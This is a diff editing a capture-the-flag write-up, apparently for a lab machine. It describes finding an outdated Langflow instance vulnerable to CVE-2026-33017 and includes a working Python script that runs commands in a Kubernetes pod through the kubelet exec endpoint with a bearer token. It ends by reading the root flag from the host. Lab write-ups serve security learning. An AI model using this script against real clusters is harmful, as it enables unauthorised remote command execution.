@@ -4,7 +4,7 @@
 
 I begin by opening the browser developer tools and immediately checking the Network tab for leaked API paths.
 
-A quick inspection reveals an exposed `/version` endpoint. Curling it shows Langflow is outdated and susceptible to  [CVE-2026-33017](https://github.com/advisories/GHSA-vwmf-pq79-vjvx), and once again the browser network tab leaks information needed for [CVE-2026-33017](https://github.com/advisories/GHSA-vwmf-pq79-vjvx), the flows identifier.
+A quick inspection reveals an exposed `/version` endpoint. Curling it shows Langflow is outdated and susceptible to [CVE-2026-33017](https://github.com/advisories/GHSA-vwmf-pq79-vjvx), and once again the network tab leaks this information.
 
 <img width="1920" height="923" alt="Screenshot From 2026-10-04 12-46-39" src="https://github.com/user-attachments/assets/857efabe-7aca-41df-9584-7cbf578f8c2a" />
 
@@ -192,9 +192,13 @@ After some API enumeration, we find our target IP for the exploit script.
 Now that we have the script, we can create the RCE exploit script.
 
 <img width="991" height="806" alt="Screenshot From 2026-10-04 16-03-44" src="https://github.com/user-attachments/assets/eaf98bdf-6047-4747-839b-2db3dae39e1f" />
+
 ```python
 #!/usr/bin/env python3
-import asyncio, ssl, sys, websockets
+import asyncio
+import ssl
+import sys
+import websockets
 
 NODE = "10.129.154.131"
 NE_NS = "monitoring"
@@ -207,38 +211,36 @@ async def ws_exec(cmd_parts):
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    
+
     args = "&".join(f"command={part}" for part in cmd_parts)
     url = (
         f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
         f"?output=1&error=1&{args}"
     )
-    
+
     async with websockets.connect(
-        url, ssl=ctx,
+        url,
+        ssl=ctx,
         additional_headers={"Authorization": f"Bearer {TOKEN}"},
         subprotocols=["v4.channel.k8s.io"],
-        open_timeout=10
+        open_timeout=10,
     ) as ws:
         try:
             while True:
                 data = await asyncio.wait_for(ws.recv(), timeout=5)
                 if isinstance(data, bytes) and len(data) > 1:
-                    # Then, we can transfer that file to the MCP pod using a simple Python server on our machine.
-                    # Then, we can fetch it from the pod.
-                    # Finally, we can read the root flag.
                     sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                     sys.stdout.flush()
         except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
             pass
 
 asyncio.run(ws_exec(COMMAND.split()))
-
 ```
+
 I now read the root flag by calling the script with the parameter:
 
 ```bash
-('cat /host/root/root/root.txt')
+python3 kube_exec.py "cat /host/root/root/root.txt"
 ```
 
 <img width="991" height="101" alt="Screenshot From 2026-10-04 16-03-16" src="https://github.com/user-attachments/assets/7916bfd9-f480-4012-9b47-7461e7360d22" />
